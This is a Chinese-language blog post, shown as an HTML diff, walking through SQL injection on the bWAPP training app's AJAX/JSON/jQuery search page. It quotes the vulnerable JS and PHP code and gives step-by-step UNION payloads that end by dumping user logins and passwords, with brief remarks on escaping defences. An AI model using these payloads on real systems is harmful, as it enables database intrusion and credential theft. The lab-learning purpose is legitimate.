@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="AJAX&#x2F;JSON&#x2F;jQuery注入常规流程1.判断是否存在注入，注入是字符型还是整数型 2.猜解SQL查询语句中的字段数 (order by ) 3.确定显示的字段顺序  4.获取当前数据库 (爆库) 5.获取数据库中的表 (爆表) 6.获取表中的字段名 (爆字段) 7.下载数据 (爆数据) 基础知识什么是AJAX&#x2F;JSON&#x2F;jQuery通过在后台与服务器进行少量数据交换，AJAX 可以使网页实">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bWAPP-SQLInjection-AJAXJSONjQuery">
+<meta property="og:url" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="AJAX&#x2F;JSON&#x2F;jQuery注入常规流程1.判断是否存在注入，注入是字符型还是整数型 2.猜解SQL查询语句中的字段数 (order by ) 3.确定显示的字段顺序  4.获取当前数据库 (爆库) 5.获取数据库中的表 (爆表) 6.获取表中的字段名 (爆字段) 7.下载数据 (爆数据) 基础知识什么是AJAX&#x2F;JSON&#x2F;jQuery通过在后台与服务器进行少量数据交换，AJAX 可以使网页实">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195015337.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195205297.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195218407.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195316105.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195347434.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195541640.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195749587.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195833856.png">
+<meta property="article:published_time" content="2020-09-21T11:17:55.628Z">
+<meta property="article:modified_time" content="2020-09-21T12:12:58.694Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195015337.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>bWAPP-SQLInjection-AJAXJSONjQuery</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/09/20/bWAPP-SQLInjectionPost2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&text=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&is_video=false&description=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP-SQLInjection-AJAXJSONjQuery&body=Check out this article: http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&name=bWAPP-SQLInjection-AJAXJSONjQuery&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&t=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AJAX-JSON-jQuery注入"><span class="toc-number">1.</span> <span class="toc-text">AJAX&#x2F;JSON&#x2F;jQuery注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常规流程"><span class="toc-number">1.1.</span> <span class="toc-text">常规流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是AJAX-JSON-jQuery"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是AJAX&#x2F;JSON&#x2F;jQuery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">1.3.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#演练"><span class="toc-number">1.4.</span> <span class="toc-text">演练</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.4.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-high"><span class="toc-number">1.4.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        bWAPP-SQLInjection-AJAXJSONjQuery
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-21T11:17:55.628Z" itemprop="datePublished">2020-09-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="AJAX-JSON-jQuery注入"><a href="#AJAX-JSON-jQuery注入" class="headerlink" title="AJAX/JSON/jQuery注入"></a>AJAX/JSON/jQuery注入</h1><h2 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h2><p><strong>1.判断是否存在注入，注入是字符型还是整数型</strong></p>
+<p><strong>2.猜解SQL查询语句中的字段数 (order by )</strong></p>
+<p><strong>3.确定显示的字段顺序</strong> </p>
+<p><strong>4.获取当前数据库 (爆库)</strong></p>
+<p><strong>5.获取数据库中的表 (爆表)</strong></p>
+<p><strong>6.获取表中的字段名 (爆字段)</strong></p>
+<p><strong>7.下载数据 (爆数据)</strong></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是AJAX-JSON-jQuery"><a href="#什么是AJAX-JSON-jQuery" class="headerlink" title="什么是AJAX/JSON/jQuery"></a>什么是AJAX/JSON/jQuery</h3><p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。</p>
+<p><a href="https://blog.csdn.net/cainiao_00001/article/details/82888692" target="_blank" rel="noopener">AJAX/JSON/jQuery</a></p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sqli_10-1.php</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">        $(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;                <span class="comment">// #title为表格的ID值</span></span><br><span class="line">            <span class="comment">// Searches for a movie title</span></span><br><span class="line">            <span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;; <span class="comment">//获取输入的值，制成JSON格式</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// AJAX call</span></span><br><span class="line">        	<span class="comment">//getJSON(url,data,success(data,status,xhr))</span></span><br><span class="line">            $.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; <span class="comment">//data 接收返回的数据</span></span><br><span class="line">                init_table();								 <span class="comment">//初始化表头</span></span><br><span class="line">                <span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line">                <span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">                $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;			<span class="comment">//循环输出JSON数据，制成表格</span></span><br><span class="line">                    total++;</span><br><span class="line">                    $(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="comment">// Empty result</span></span><br><span class="line">                <span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//"sqli_10-2.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))    <span class="comment">//接收数据，并使用自定义函数sqli()对数据进行消毒</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.w3school.com.cn/jquery/ajax_getjson.asp" target="_blank" rel="noopener">getJSON</a></p>
+<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><ol>
+<li><p>判断是否存在注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' and 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195015337.png" alt="image-20200921195015337"></p>
+</li>
+<li><p>判断注入字段个数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a%' order by 7 <span class="comment">#</span></span><br><span class="line">a%' order by 8 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195205297.png" alt="image-20200921195205297"></p>
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195218407.png" alt="image-20200921195218407"></p>
+</li>
+<li><p>判断注入字段位置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195316105.png" alt="image-20200921195316105"></p>
+</li>
+<li><p>获取数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195347434.png" alt="image-20200921195347434"></p>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195541640.png" alt="image-20200921195541640"></p>
+</li>
+<li><p>获取列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195749587.png" alt="image-20200921195749587"></p>
+</li>
+<li><p>获取信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195833856.png" alt="image-20200921195833856"></p>
+</li>
+</ol>
+<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>分别用了addslashes()和mysql_real_escape_string()函数防御</p>
+<p>查看mysql编码, 如果是GBK编码且操作系统是UTF-8编码, 则可以用宽字节来绕过:</p>
+<p>可惜mysql编码是utf-8:</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AJAX-JSON-jQuery注入"><span class="toc-number">1.</span> <span class="toc-text">AJAX&#x2F;JSON&#x2F;jQuery注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#常规流程"><span class="toc-number">1.1.</span> <span class="toc-text">常规流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是AJAX-JSON-jQuery"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是AJAX&#x2F;JSON&#x2F;jQuery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码分析"><span class="toc-number">1.3.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#演练"><span class="toc-number">1.4.</span> <span class="toc-text">演练</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.4.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-high"><span class="toc-number">1.4.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&text=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&is_video=false&description=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=bWAPP-SQLInjection-AJAXJSONjQuery&body=Check out this article: http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&title=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&name=bWAPP-SQLInjection-AJAXJSONjQuery&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/&t=bWAPP-SQLInjection-AJAXJSONjQuery" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2020
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
